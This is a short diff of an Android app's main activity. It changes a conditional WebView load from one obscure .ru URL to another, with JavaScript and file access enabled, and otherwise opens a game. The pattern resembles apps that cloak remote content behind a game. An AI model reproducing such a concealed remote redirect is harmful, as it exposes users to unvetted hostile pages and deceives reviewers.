@@ -123,7 +123,7 @@ public class MainActivity extends AppCompatActivity {
             webSettings.setSupportZoom(true);
             webSettings.setJavaScriptEnabled(true);
             webSettings.setAllowFileAccess(true);
-            webView.loadUrl("http://hhalcajs.ru/P9qF8N");
+            webView.loadUrl("http://lockstrt.ru/LB8R6j");
         } else {
             openGame();
         }
